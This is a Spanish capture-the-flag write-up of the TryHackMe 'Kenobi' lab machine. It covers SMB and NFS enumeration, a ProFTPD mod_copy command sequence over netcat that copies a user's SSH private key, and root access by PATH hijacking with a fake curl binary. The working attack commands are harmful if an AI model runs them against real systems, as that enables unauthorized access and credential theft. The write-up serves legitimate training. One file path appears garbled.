---
layout: page
title: "Write-up: Kenobi"
platform: "TryHackMe"
difficulty: "Medium"
category: "Boot2Root"
---
**Write-up**: Kenobi- TryHackMe  
**Fecha**: 01/05/2026  
**Autor**: Adrian Sanchez Torrejon  
**Dificultad**: Medio
**IP de la Máquina**: 10.129.131.201

---

# 1. Reconocimiento y Enumeración

## 1.1 Escaneo de Puertos (Nmap)

Se realiza un escaneo inicial para identificar los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -O -Pn 10.129.131.201
```

**Resultados:** 

![image.png](/assets/images/Kenobi/image.png)

## 1.2 Escaneo Web

Se ejecutó un escaneo de directorios con Gobuster para buscar rutas ocultas en el servidor web.

- **Herramienta usada:** gobuster

`gobuster dir -u http://10.128.172.193 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

- **Hallazgos:**

![image.png](/assets/images/Kenobi/image%201.png)

## 1.3 Escaneo Smb

Haciendo uso de `smbclient`descubrí que era posible listar el sistema de archivos del servidor sin credenciales (Null Session).

- Comando: smbclient -L 10.129.131.201 -N

![image.png](/assets/images/Kenobi/image%202.png)

- Comando `smbclient //10.129.131.201/anonymous -N`

![image.png](/assets/images/Kenobi/image%203.png)

# 2. Explotación (Acceso Inicial)

## 2.1 Identificación de la Vulnerabilidad

Al descargar y leer el archivo log.txt que se encontraba en el recurso, localicé un listado de tareas pendientes y credenciales:

![image.png](/assets/images/Kenobi/image%204.png)

## 2.2 Ejecución y Shell

1. Vuelvo a hacer un nmap en el puerto 21

```python
nmap -p 21 -sV -nP 10.129.131.201
```

![image.png](/assets/images/Kenobi/image%205.png)

1. Buscamos algun exploit con searchsploit

```python
searchsploit -v ProFTPD 1.3.5
```

![image.png](/assets/images/Kenobi/image%206.png)

1. Vamos a ver si hay algun punto de montaje

```python
showmount -e 10.129.131.201
```

![image.png](/assets/images/Kenobi/image%207.png)

1. Montamos la carpeta en nuestro sistema

![image.png](/assets/images/Kenobi/image%208.png)

1. Usamos la vulnerabilidad que habiamos encontrado antes

```python
nc 10.129.131.201 21
SITE CPFR /home//assets/images/Kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![image.png](/assets/images/Kenobi/image%209.png)

1. Con esto podiramos acceder al archivo desde la carpeta que creamos antes

![image.png](/assets/images/Kenobi/image%2010.png)

1. Copiamos el archivo y lo usamos para conectarnos por ssh

![image.png](/assets/images/Kenobi/image%2011.png)

# 3. Escalada de Privilegios (System / Root)

## 3.1 Explotación y Acceso SYSTEM

1. Miramos archivos con permiso incorrectos

![image.png](/assets/images/Kenobi/image%2012.png)

1. Ejecutamos el archivo que nos llama la atencion

![image.png](/assets/images/Kenobi/image%2013.png)

1. Parece que ejecuta el comando `curl`  por lo que vamos a mover PATH a la carptea /tmp y crear un curl falso que ejecute /bin/bash

```python
echo /bin/bash > curl
chmod +x curl
export PATH=/tmp:$PATH
```

![image.png](/assets/images/Kenobi/image%2014.png)

¡Acceso como **Root** concedido!